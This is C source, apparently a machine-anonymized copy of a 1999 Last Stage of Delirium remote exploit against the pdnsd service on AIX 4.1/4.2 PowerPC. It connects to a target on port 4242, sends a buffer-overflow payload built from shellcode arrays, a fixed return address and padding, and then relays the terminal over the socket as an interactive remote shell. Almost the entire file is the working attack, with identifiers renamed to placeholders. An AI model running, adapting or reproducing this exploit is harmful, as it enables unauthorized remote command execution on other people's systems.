
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {int sin_port; TYPE_1__ sin_addr; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {int h_addr; } ;
typedef int fd_set ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 scalar_t__ VAR_3 ;
 scalar_t__ VAR_4 ;
 scalar_t__ VAR_5 ;
 scalar_t__ FUNC_0 (int,int *) ;
 int FUNC_1 (int,int *) ;
 int VAR_6 ;
 int FUNC_2 (int *) ;
 int VAR_7 ;
 int VAR_8 ;
 int VAR_9 ;
 int VAR_10 ;
 int FUNC_3 (char*) ;
 scalar_t__ FUNC_4 (int,struct sockaddr*,int) ;
 scalar_t__ VAR_11 ;
 int FUNC_5 (int) ;
 int FUNC_6 (int ) ;
 void** VAR_12 ;
 struct hostent* FUNC_7 (char*) ;
 int FUNC_8 (int,struct sockaddr*,int*) ;
 unsigned long FUNC_9 (int) ;
 int FUNC_10 (int) ;
 int FUNC_11 (char*) ;
 int FUNC_12 (int,char,...) ;
 int FUNC_13 (void**,int ,int) ;
 int * VAR_13 ;
 int FUNC_14 (int ) ;
 int FUNC_15 (char*) ;
 int FUNC_16 (char*,...) ;
 int FUNC_17 (int,char*,int) ;
 scalar_t__ FUNC_18 (int ,int *,int *,int *,int *) ;
 int FUNC_19 (int,char*,int,int ) ;
 void** VAR_14 ;
 int FUNC_20 (int) ;
 int FUNC_21 (int ,int ,int ) ;
 int VAR_15 ;
 int FUNC_22 (void**) ;
 void** VAR_16 ;
 int FUNC_23 (int,char*,int) ;

FUNC_24(int VAR_17,char **VAR_18){
    char VAR_19[10000],VAR_20[4],*VAR_21;
    int VAR_22,VAR_23,VAR_24,VAR_25,VAR_26;
    struct hostent *VAR_27;
    struct sockaddr_in VAR_28;

    FUNC_16("copyright LAST STAGE OF DELIRIUM oct 1999 poland  //lsd-pl.net/\n");
    FUNC_16("pdnsd for AIX 4.1 4.2 PowerPC/POWER\n\n");

    if(VAR_17!=3){
        FUNC_16("usage: %s address 41|42\n",VAR_18[0]);FUNC_5(-1);
    }

    switch(FUNC_3(VAR_18[2])){
    case 41: FUNC_13(&VAR_16[32],VAR_8,12); break;
    case 42: FUNC_13(&VAR_16[32],VAR_9,12); break;
    default: FUNC_5(-1);
    }

    VAR_26=FUNC_21(VAR_1,VAR_10,0);
    VAR_28.sin_family=VAR_1;
    VAR_28.sin_port=FUNC_10(4242);
    if((VAR_28.sin_addr.s_addr=FUNC_11(VAR_18[1]))==-1){
        if((VAR_27=FUNC_7(VAR_18[1]))==((void*)0)){
            VAR_11=VAR_3;FUNC_15("error");FUNC_5(-1);
        }
        FUNC_13(&VAR_28.sin_addr.s_addr,VAR_27->h_addr,4);
    }

    if(FUNC_4(VAR_26,(struct sockaddr*)&VAR_28,sizeof(struct sockaddr_in))<0){
        FUNC_15("error");FUNC_5(-1);
    }

    VAR_24=VAR_0+VAR_7+FUNC_22(VAR_14);
    *((unsigned long*)VAR_20)=FUNC_9(0x2ff20908+(VAR_7>>1));

    VAR_22=sizeof(struct sockaddr_in);
    if(FUNC_8(VAR_26,(struct sockaddr*)&VAR_28,&VAR_22)==-1){
        struct netbuf {unsigned int maxlen;unsigned int len;char *buf;}VAR_29;
        FUNC_12(VAR_26,(('S'<<8)|2),"sockmod");
        VAR_29.maxlen=0xffff;
        VAR_29.len=sizeof(struct sockaddr_in);;
        VAR_29.buf=(char*)&VAR_28;
        FUNC_12(VAR_26,(('T'<<8)|144),&VAR_29);
    }
    VAR_23=FUNC_14(VAR_28.sin_port);
    FUNC_16("port=%d connected! ",VAR_23);FUNC_6(VAR_15);

    VAR_12[0+2]=(unsigned char)((VAR_23&0xff00)>>8);
    VAR_12[0+3]=(unsigned char)(VAR_23&0xff);

    VAR_21=VAR_19;
    *((unsigned long*)VAR_21)=FUNC_9(VAR_24);
    VAR_21+=4;
    for(VAR_22=0;VAR_22<VAR_7;VAR_22++) *VAR_21++=VAR_13[VAR_22%4];
    for(VAR_22=0;VAR_22<FUNC_22(VAR_16);VAR_22++) *VAR_21++=VAR_16[VAR_22];
    for(VAR_22=0;VAR_22<FUNC_22(VAR_12);VAR_22++) *VAR_21++=VAR_12[VAR_22];
    for(VAR_22=0;VAR_22<FUNC_22(VAR_14);VAR_22++) *VAR_21++=VAR_14[VAR_22];
    for(VAR_22=0;VAR_22<VAR_2;VAR_22++) *VAR_21++=VAR_20[VAR_22%4];
    for(VAR_22=0;VAR_22<VAR_0;VAR_22++) *VAR_21++=VAR_20[VAR_22%4];
    *VAR_21=0;

    FUNC_23(VAR_26,VAR_19,4+VAR_24-1);FUNC_20(3);
    FUNC_19(VAR_26,"x",1,0);
    FUNC_16("sent!\n");

    FUNC_23(VAR_26,"/bin/uname -a\n",14);
    while(1){
        fd_set VAR_30;
        FUNC_2(&VAR_30);
        FUNC_1(0,&VAR_30);
        FUNC_1(VAR_26,&VAR_30);
        if(FUNC_18(VAR_6,&VAR_30,((void*)0),((void*)0),((void*)0))){
            int VAR_31;
            char VAR_32[1024];
            if(FUNC_0(0,&VAR_30)){
                if((VAR_31=FUNC_17(0,VAR_32,1024))<1){
                    if(VAR_11==VAR_5||VAR_11==VAR_4) continue;
                    else break;
                }
                FUNC_23(VAR_26,VAR_32,VAR_31);
            }
            if(FUNC_0(VAR_26,&VAR_30)){
                if((VAR_31=FUNC_17(VAR_26,VAR_32,1024))<1){
                    if(VAR_11==VAR_5||VAR_11==VAR_4) continue;
                    else break;
                }
                FUNC_23(1,VAR_32,VAR_31);
            }
        }
    }
}
